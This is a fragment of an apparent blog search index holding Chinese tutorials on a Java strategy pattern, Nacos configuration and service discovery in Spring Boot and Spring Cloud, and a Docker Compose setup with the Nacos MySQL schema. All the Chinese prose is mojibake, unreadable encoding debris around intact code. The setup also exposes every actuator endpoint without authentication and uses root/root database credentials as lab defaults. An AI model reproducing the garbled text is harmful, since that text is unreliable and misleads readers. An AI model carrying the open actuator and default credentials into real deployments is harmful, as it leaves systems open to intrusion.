EscPrinter extends PrinterAbstract { public void getPrintEsc() { System.out.println(\u0026#34;esc\u0026#34;); } } @PrinterAnnotation(type = PrinterEnum.TSC) public class TscPrinter extends PrinterAbstract { public void getPrintEsc() { System.out.println(\u0026#34;tsc\u0026#34;); } } 5ã€åˆ›å»ºä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œæ–¹ä¾¿è·å–ä¸ä½¿ç”¨\npublic class PrinterStrategy { private static Map\u0026lt;PrinterEnum, PrinterAbstract\u0026gt; printers; static { printers = new ConcurrentHashMap\u0026lt;PrinterEnum, PrinterAbstract\u0026gt;(); } public static PrinterAbstract getPrinters(PrinterEnum type) { if (printers != null) { return printers.get(type); } return null; } public static void setPrinters(PrinterEnum type, PrinterAbstract printerAbstract) { printers.put(type, printerAbstract); } } 6ã€åœ¨é¡¹ç›®å¯åŠ¨æ—¶ï¼Œå°†æ‰“å°ç±»æ·»åŠ åˆ° PrinterStrategy ä¸­ç®¡ç†\n@Component public class PrinterProcessor implements BeanPostProcessor { public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException { Class\u0026lt;?\u0026gt; aClass = bean.getClass(); if (aClass.isAnnotationPresent(PrinterAnnotation.class)) { PrinterAnnotation annotation = aClass.getAnnotation(PrinterAnnotation.class); PrinterEnum type = annotation.type(); PrinterStrategy.setPrinters(type, (PrinterAbstract) bean); } return bean; } public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException { return bean; } } 6ã€å¯ä»¥è°ƒç”¨å¹¶ä½¿ç”¨\n@SpringBootApplication @RestController public class DemoApplication { public static void main(String[] args) { SpringApplication.run(DemoApplication.class, args); } @RequestMapping(\u0026#34;/test/{printerType}\u0026#34;) public String test(@PathVariable PrinterEnum printerType) { PrinterAbstract printers = PrinterStrategy.getPrinters(printerType); if (printers != null) { printers.getPrintEsc(); } return \u0026#34;success\u0026#34;; } } "},{"id":64,"href":"/posts/history/nacos%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Nacosçš„ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"\ré…ç½®ä¸­å¿ƒ\r#\rå¯åŠ¨é…ç½®ä¸­å¿ƒ\nåœ¨SpringBootä¸­ä½¿ç”¨\r#\r1ã€æ·»åŠ webä¾èµ–å’Œnacosé…ç½®ä¸­å¿ƒä¾èµ–\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-actuator\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-config-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-config-spring-boot-actuator\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2ã€åœ¨é…ç½®æ–‡ä»¶application.propertiesä¸­æ·»åŠ nacosé…ç½®\n# Nacosé…ç½®ä¸­å¿ƒåœ°å€ nacos.config.server-addr=127.0.0.1:8848 # endpoint http://localhost:8080/actuator/nacos-config # health http://localhost:8080/actuator/health # ä¸éœ€è¦èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹è®¿é—®æ‰€æœ‰actuatorç«¯ç‚¹ management.endpoints.web.exposure.include=* # å°†å¥åº·ä¿¡æ¯å±•ç¤ºç»™æ‰€æœ‰ç”¨æˆ· management.endpoint.health.show-details=always 3ã€åœ¨é…ç½®ç±»ä¸­å¯ç”¨Nacosé…ç½®ä¸­å¿ƒ\n@SpringBootApplication @NacosPropertySource(dataId = \u0026#34;example\u0026#34;, groupId = \u0026#34;DEFAULT_GROUP\u0026#34;, autoRefreshed = true) public class NacosConfigApplication { public static void main(String[] args) { SpringApplication.run(NacosConfigApplication.class, args); } } å…¶ä¸­dataIdå’ŒgroupIdå¯¹åº”æˆ‘ä»¬åœ¨é…ç½®ä¸­å¿ƒä¸­é…ç½®çš„DataIdå’Œgroupå€¼ã€‚å¦‚ä¸‹å›¾ 4ã€ç¤ºä¾‹ä»£ç æµ‹è¯•ã€‚\n@Controller @RequestMapping(\u0026#34;config\u0026#34;) public class ConfigController { @NacosValue(value = \u0026#34;${useLocalCache:false}\u0026#34;, autoRefreshed = true) private boolean useLocalCache; @RequestMapping(value = \u0026#34;/get\u0026#34;, method = GET) @ResponseBody public boolean get() { return useLocalCache; } } åœ¨SpringCloudä¸­ä½¿ç”¨\r#\r1ã€æ·»åŠ webå’ŒNacosä¾èµ–\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-config\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.2.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2ã€åœ¨boostrap.propertiesä¸­é…ç½®Nacos\nspring.cloud.nacos.config.server-addr=127.0.0.1:8848 spring.application.name=example spring.cloud.nacos.config.file-extension=properties åœ¨ Nacos Spring Cloud ä¸­ï¼ŒdataId çš„å®Œæ•´æ ¼å¼å¦‚ä¸‹ï¼š\n${prefix}-${spring.profiles.active}.${file-extension}\nprefix é»˜è®¤ä¸º spring.application.name çš„å€¼ï¼Œä¹Ÿå¯ä»¥é€šè¿‡é…ç½®é¡¹ spring.cloud.nacos.config.prefixæ¥é…ç½®ã€‚ spring.profiles.active å³ä¸ºå½“å‰ç¯å¢ƒå¯¹åº”çš„ profileï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒ Spring Bootæ–‡æ¡£ã€‚ æ³¨æ„ï¼šå½“ spring.profiles.active ä¸ºç©ºæ—¶ï¼Œå¯¹åº”çš„è¿æ¥ç¬¦ - ä¹Ÿå°†ä¸å­˜åœ¨ï¼ŒdataId çš„æ‹¼æ¥æ ¼å¼å˜æˆ ${prefix}.${file-extension} file-exetension ä¸ºé…ç½®å†…å®¹çš„æ•°æ®æ ¼å¼ï¼Œå¯ä»¥é€šè¿‡é…ç½®é¡¹ spring.cloud.nacos.config.file-extension æ¥é…ç½®ã€‚ç›®å‰åªæ”¯æŒ properties å’Œ yaml ç±»å‹ã€‚ 3ã€ç¤ºä¾‹ä»£ç \n@RestController @RequestMapping(\u0026#34;/config\u0026#34;) @RefreshScope public class ConfigController { @Value(\u0026#34;${useLocalCache:false}\u0026#34;) private boolean useLocalCache; /** * http://localhost:8080/config/get */ @RequestMapping(\u0026#34;/get\u0026#34;) public boolean get() { return useLocalCache; } } å¤šé…ç½®æ–‡ä»¶\r#\rå¾ˆå¤šåº”ç”¨éƒ½ä¼šç”¨åˆ°å¤šä¸ªé…ç½®æ–‡ä»¶ç®¡ç†é…ç½®ï¼Œæ¯”å¦‚æˆ‘ä»¬ç°åœ¨æƒ³è¦é…ç½®ä¸€ä¸ªmysqlå’Œä¸€ä¸ªredisï¼Œä½†æ˜¯åˆä¸æƒ³å•ç‹¬æ”¾åœ¨ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼•ç”¨å¤šä¸ªé…ç½®æ–‡ä»¶ã€‚\nspring.application.name=multi-data-ids-example spring.cloud.nacos.config.server-addr=127.0.0.1:8848 # é…ç½®ä¸€ä¸ªåº”ç”¨çº§çš„é…ç½®ï¼Œéœ€è¦è‡ªåŠ¨åˆ·æ–°é…ç½®ã€‚ spring.cloud.nacos.config.ext-config[0].data-id=app.properties spring.cloud.nacos.config.ext-config[0].group=multi-data-ids spring.cloud.nacos.config.ext-config[0].refresh=true # é…ç½®ä¸€ä¸ªMysqlæ•°æ®æºé…ç½®ã€‚ spring.cloud.nacos.config.ext-config[1].data-id=datasource.properties spring.cloud.nacos.config.ext-config[1].group=multi-data-ids # é…ç½®ä¸€ä¸ªRedisæ•°æ®æºé…ç½®ã€‚ spring.cloud.nacos.config.ext-config[2].data-id=redis.properties spring.cloud.nacos.config.ext-config[2].group=multi-data-ids é™¤äº†è¿™æ ·å¼•å…¥ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨æ³¨è§£çš„å½¢å¼å¼•å…¥\n@SpringBootApplication @NacosPropertySources({ @NacosPropertySource(dataId = \u0026#34;app.properties\u0026#34;, groupId = \u0026#34;multi-data-ids\u0026#34;, autoRefreshed = true), @NacosPropertySource(dataId = \u0026#34;datasource.properties\u0026#34;, groupId = \u0026#34;multi-data-ids\u0026#34;, autoRefreshed = false), @NacosPropertySource(dataId = \u0026#34;redis.properties\u0026#34;, groupId = \u0026#34;multi-data-ids\u0026#34;, autoRefreshed = false) }) public class SpringBootMySQLApplication { public static void main(String[] args) { SpringApplication.run(SpringBootMySQLApplication.class, args); } } æ³¨å†Œä¸­å¿ƒ\r#\ræœåŠ¡å‘ç°\r#\r1ã€æ·»åŠ ä¾èµ–\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.nacos\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-client\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.nacos\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-client\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.hibernate\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hibernate-validator\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.1.0.Final\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 2ã€é…ç½®NacosæœåŠ¡åœ°å€\nserver.port=8070 spring.application.name=service-provider spring.cloud.nacos.discovery.server-addr=127.0.0.1:8848 3ã€å¯ç”¨æœåŠ¡å‘ç°,å¹¶ç¼–å†™æµ‹è¯•æ¥å£\n@SpringBootApplication @EnableDiscoveryClient public class NacosProviderApplication { public static void main(String[] args) { SpringApplication.run(NacosProviderApplication.class, args); } @RestController class EchoController { @RequestMapping(value = \u0026#34;/echo/{string}\u0026#34;, method = RequestMethod.GET) public String echo(@PathVariable String string) { return \u0026#34;Hello Nacos Discovery \u0026#34; + string; } } } æœåŠ¡æ¶ˆè´¹\r#\r1ã€æ·»åŠ ä¾èµ–\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-netflix-ribbon\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.0.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-openfeign\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.0.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.nacos\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-client\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.nacos\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;nacos-client\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 2ã€é…ç½®Nacosåœ°å€\nserver.port=8080 spring.application.name=service-consumer spring.cloud.nacos.discovery.server-addr=127.0.0.1:8848 3ã€å¯ç”¨æœåŠ¡å‘ç°ä¸æ¶ˆè´¹\n@SpringBootApplication @EnableDiscoveryClient public class NacosConsumerApplication { @LoadBalanced @Bean public RestTemplate restTemplate() { return new RestTemplate(); } public static void main(String[] args) { SpringApplication.run(NacosConsumerApplication.class, args); } @RestController public class TestController { private final RestTemplate restTemplate; @Autowired public TestController(RestTemplate restTemplate) {this.restTemplate = restTemplate;} @RequestMapping(value = \u0026#34;/echo/{str}\u0026#34;, method = RequestMethod.GET) public String echo(@PathVariable String str) { return restTemplate.getForObject(\u0026#34;http://service-provider/echo/\u0026#34; + str, String.class); } } } 4ã€ä½¿ç”¨OpenFeignæ¥è°ƒç”¨\nFeignç±»\n@FeignClient(\u0026#34;service-provider\u0026#34;) public interface RemoteServer { @RequestMapping(value = \u0026#34;/echo/{string}\u0026#34;) String echo(@PathVariable(\u0026#34;string\u0026#34;) String string); } Feignè¿œç¨‹è°ƒç”¨ï¼Œè¦å¯ç”¨@EnableFeignClients\n@SpringBootApplication @RestController @EnableDiscoveryClient @EnableFeignClients public class NacosConsumerApplication { @LoadBalanced @Bean public RestTemplate restTemplate() { return new RestTemplate(); } public static void main(String[] args) { SpringApplication.run(NacosConsumerApplication.class, args); } @Resource private RemoteServer remoteServer; @RequestMapping(value = \u0026#34;/feign/echo/{str}\u0026#34;, method = RequestMethod.GET) public String feignEcho(@PathVariable String str) { return remoteServer.echo(str); } } å®Œç»“ã€‚\n"},{"id":65,"href":"/posts/history/nacos%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%90%AD%E5%BB%BA/","title":"NacosæœåŠ¡çš„æ­å»º","section":"æˆ‘çš„åšå®¢","content":"Nacos æ˜¯ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒå’ŒæœåŠ¡é…ç½®ä¸­å¿ƒä¸€ä½“åŒ–çš„ç»„ä»¶ã€‚éœ€è¦æˆ‘ä»¬å»å®‰è£…NacosæœåŠ¡ï¼Œå¹¶è¿è¡Œã€‚\nå®‰è£…Nacos æœåŠ¡\r#\rç”±äºä¸ªäººæ¯”è¾ƒå–œæ¬¢ä½¿ç”¨Dockeræ¥æ­å»ºå„ç§å­¦ä¹ æœåŠ¡ï¼ŒåŒæ ·ï¼Œä¸‹é¢ä¹Ÿä½¿ç”¨Dockeræ¥æ­å»ºNacosæœåŠ¡ï¼Œå‚è€ƒ\rå®˜æ–¹ã€‚\n1ã€Dockerfileæ–‡ä»¶\nversion: \u0026#39;3.1\u0026#39; services: # mysql æ•°æ®åº“ mysql: container_name: mysql image: mysql:5.7 command: --default-authentication-plugin=mysql_native_password restart: always ports: - 3306:3306 environment: MYSQL_ROOT_PASSWORD: root # Nacos æœåŠ¡æ³¨å†Œä¸­å¿ƒ nacos: image: nacos/nacos-server:latest container_name: nacos-standalone-mysql env_file: - ./env/nacos-standlone-mysql.env volumes: - ./env/custom.properties:/home/nacos/init.d/custom.properties ports: - \u0026#34;8848:8848\u0026#34; - \u0026#34;9555:9555\u0026#34; depends_on: - mysql restart: on-failure # æ­å»ºprometheusé‡‡é›†Nacos metricsæ•°æ® prometheus: container_name: prometheus image: prom/prometheus:latest volumes: - ./env/prometheus-standalone.yaml:/etc/prometheus/prometheus.yml ports: - \u0026#34;9090:9090\u0026#34; depends_on: - nacos restart: on-failure # æ­å»ºgrafanaå›¾å½¢åŒ–å±•ç¤ºmetricsæ•°æ® grafana: container_name: grafana image: grafana/grafana:latest ports: - 3000:3000 restart: on-failure 2ã€nacos-standlone-mysql.envé…ç½®æ–‡ä»¶\nPREFER_HOST_MODE=hostname # æœåŠ¡åœ°å€æ¨¡å¼ MODE=standalone # æœåŠ¡é›†ç¾¤æ¨¡å¼ SPRING_DATASOURCE_PLATFORM=mysql # ä½¿ç”¨çš„æ•°æ®åº“ç±»å‹ MYSQL_SERVICE_HOST=mysql # æ•°æ®åº“åœ°å€ MYSQL_SERVICE_DB_NAME=nacos_devtest # æ•°æ®åº“åç§° MYSQL_SERVICE_PORT=3306 # ç«¯å£ MYSQL_SERVICE_USER=root # ç”¨æˆ·å MYSQL_SERVICE_PASSWORD=root #å¯†ç  3ã€prometheus-standalone.yaml\n# my global config global: scrape_interval: 15s # Set the scrape interval to every 15 seconds. Default is every 1 minute. evaluation_interval: 15s # Evaluate rules every 15 seconds. The default is every 1 minute. # scrape_timeout is set to the global default (10s). # Alertmanager configuration alerting: alertmanagers: - static_configs: - targets: # - alertmanager:9093 # Load rules once and periodically evaluate them according to the global \u0026#39;evaluation_interval\u0026#39;. rule_files: # - \u0026#34;first_rules.yml\u0026#34; # - \u0026#34;second_rules.yml\u0026#34; # A scrape configuration containing exactly one endpoint to scrape: # Here it\u0026#39;s Prometheus itself. scrape_configs: # The job name is added as a label `job=\u0026lt;job_name\u0026gt;` to any timeseries scraped from this config. - job_name: \u0026#39;prometheus\u0026#39; # metrics_path defaults to \u0026#39;/metrics\u0026#39; # scheme defaults to \u0026#39;http\u0026#39;. static_configs: - targets: [\u0026#39;localhost:9090\u0026#39;] # å¯¹å¤–è®¿é—®ç«¯å£ - job_name: \u0026#39;nacos\u0026#39; metrics_path: \u0026#39;/nacos/actuator/prometheus\u0026#39; static_configs: - targets: [\u0026#39;nacos:8848\u0026#39;] # NacosæœåŠ¡åœ°å€ 4ã€custom.properties\n#spring.security.enabled=false #management.security=false #security.basic.enabled=false #nacos.security.ignore.urls=/** #management.metrics.export.elastic.host=http://localhost:9200 # metrics for prometheus management.endpoints.web.exposure.include=* # metrics for elastic search #management.metrics.export.elastic.enabled=false #management.metrics.export.elastic.host=http://localhost:9200 # metrics for influx #management.metrics.export.influx.enabled=false #management.metrics.export.influx.db=springboot #management.metrics.export.influx.uri=http://localhost:8086 #management.metrics.export.influx.auto-create-db=true #management.metrics.export.influx.consistency=one #management.metrics.export.influx.compressed=true 5ã€å‡†å¤‡å®Œè¿™äº›ä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸ºNacosåˆ›å»ºä¸€äº›æ•°æ®åº“è¡¨,\ræ•°æ®åº“è„šæœ¬å®˜ç½‘\rGITHUBæ‰¾æ‰¾ï¼Œä¸‹é¢æˆ‘ä¹Ÿç²˜è´´å‡ºæ¥ã€‚\n/* * Copyright 1999-2018 Alibaba Group Holding Ltd. * * Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_info */ /******************************************/ CREATE TABLE `config_info` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(255) DEFAULT NULL, `content` longtext NOT NULL COMMENT \u0026#39;content\u0026#39;, `md5` varchar(32) DEFAULT NULL COMMENT \u0026#39;md5\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;åˆ›å»ºæ—¶é—´\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;ä¿®æ”¹æ—¶é—´\u0026#39;, `src_user` text COMMENT \u0026#39;source user\u0026#39;, `src_ip` varchar(20) DEFAULT NULL COMMENT \u0026#39;source ip\u0026#39;, `app_name` varchar(128) DEFAULT NULL, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;ç§Ÿæˆ·å­—æ®µ\u0026#39;, `c_desc` varchar(256) DEFAULT NULL, `c_use` varchar(64) DEFAULT NULL, `effect` varchar(64) DEFAULT NULL, `type` varchar(64) DEFAULT NULL, `c_schema` text, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfo_datagrouptenant` (`data_id`,`group_id`,`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;config_info\u0026#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_info_aggr */ /******************************************/ CREATE TABLE `config_info_aggr` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(255) NOT NULL COMMENT \u0026#39;group_id\u0026#39;, `datum_id` varchar(255) NOT NULL COMMENT \u0026#39;datum_id\u0026#39;, `content` longtext NOT NULL COMMENT \u0026#39;å†…å®¹\u0026#39;, `gmt_modified` datetime NOT NULL COMMENT \u0026#39;ä¿®æ”¹æ—¶é—´\u0026#39;, `app_name` varchar(128) DEFAULT NULL, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;ç§Ÿæˆ·å­—æ®µ\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfoaggr_datagrouptenantdatum` (`data_id`,`group_id`,`tenant_id`,`datum_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;å¢åŠ ç§Ÿæˆ·å­—æ®µ\u0026#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_info_beta */ /******************************************/ CREATE TABLE `config_info_beta` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(128) NOT NULL COMMENT \u0026#39;group_id\u0026#39;, `app_name` varchar(128) DEFAULT NULL COMMENT \u0026#39;app_name\u0026#39;, `content` longtext NOT NULL COMMENT \u0026#39;content\u0026#39;, `beta_ips` varchar(1024) DEFAULT NULL COMMENT \u0026#39;betaIps\u0026#39;, `md5` varchar(32) DEFAULT NULL COMMENT \u0026#39;md5\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;åˆ›å»ºæ—¶é—´\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;ä¿®æ”¹æ—¶é—´\u0026#39;, `src_user` text COMMENT \u0026#39;source user\u0026#39;, `src_ip` varchar(20) DEFAULT NULL COMMENT \u0026#39;source ip\u0026#39;, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;ç§Ÿæˆ·å­—æ®µ\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfobeta_datagrouptenant` (`data_id`,`group_id`,`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;config_info_beta\u0026#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_info_tag */ /******************************************/ CREATE TABLE `config_info_tag` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \u0026#39;id\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(128) NOT NULL COMMENT \u0026#39;group_id\u0026#39;, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;tenant_id\u0026#39;, `tag_id` varchar(128) NOT NULL COMMENT \u0026#39;tag_id\u0026#39;, `app_name` varchar(128) DEFAULT NULL COMMENT \u0026#39;app_name\u0026#39;, `content` longtext NOT NULL COMMENT \u0026#39;content\u0026#39;, `md5` varchar(32) DEFAULT NULL COMMENT \u0026#39;md5\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;åˆ›å»ºæ—¶é—´\u0026#39;, `gmt_modified` datetime NOT NULL DEFAULT \u0026#39;2010-05-05 00:00:00\u0026#39; COMMENT \u0026#39;ä¿®æ”¹æ—¶é—´\u0026#39;, `src_user` text COMMENT \u0026#39;source user\u0026#39;, `src_ip` varchar(20) DEFAULT NULL COMMENT \u0026#39;source ip\u0026#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfotag_datagrouptenanttag` (`data_id`,`group_id`,`tenant_id`,`tag_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;config_info_tag\u0026#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_tags_relation */ /******************************************/ CREATE TABLE `config_tags_relation` ( `id` bigint(20) NOT NULL COMMENT \u0026#39;id\u0026#39;, `tag_name` varchar(128) NOT NULL COMMENT \u0026#39;tag_name\u0026#39;, `tag_type` varchar(64) DEFAULT NULL COMMENT \u0026#39;tag_type\u0026#39;, `data_id` varchar(255) NOT NULL COMMENT \u0026#39;data_id\u0026#39;, `group_id` varchar(128) NOT NULL COMMENT \u0026#39;group_id\u0026#39;, `tenant_id` varchar(128) DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;tenant_id\u0026#39;, `nid` bigint(20) NOT NULL AUTO_INCREMENT, PRIMARY KEY (`nid`), UNIQUE KEY `uk_configtagrelation_configidtag` (`id`,`tag_name`,`tag_type`), KEY `idx_tenant_id` (`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\u0026#39;config_tag_relation\u0026#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = group_capacity */ /******************************************/ CREATE TABLE `group_capacity` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT \u0026#39;ä¸»é”®ID\u0026#39;, `group_id` varchar(128) NOT NULL DEFAULT \u0026#39;\u0026#39; COMMENT \u0026#39;Group IDï¼Œç©ºå­—ç¬¦è¡¨ç¤ºæ•´ä¸ªé›†ç¾¤\u0026#39;, `quota` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;é…é¢ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼\u0026#39;, `usage` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;ä½¿ç”¨é‡\u0026#39;, `max_size` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;å•ä¸ªé…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼\u0026#39;, `max_aggr_count` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;èšåˆå­é…ç½®æœ€å¤§ä¸ªæ•°ï¼Œï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼\u0026#39;, `max_aggr_size` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;å•ä¸ªèšåˆæ•°æ®çš„å­é…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼\u0026#39;, `max_history_count` int(10) unsigned NOT NULL DEFAULT \u0026#39;0\u0026#39; COMMENT \u0026#39;æœ€å¤§å˜æ›´å†å²æ•°é‡\u0026#39;, `gmt_create` datetime NOT NULL DEFAULT 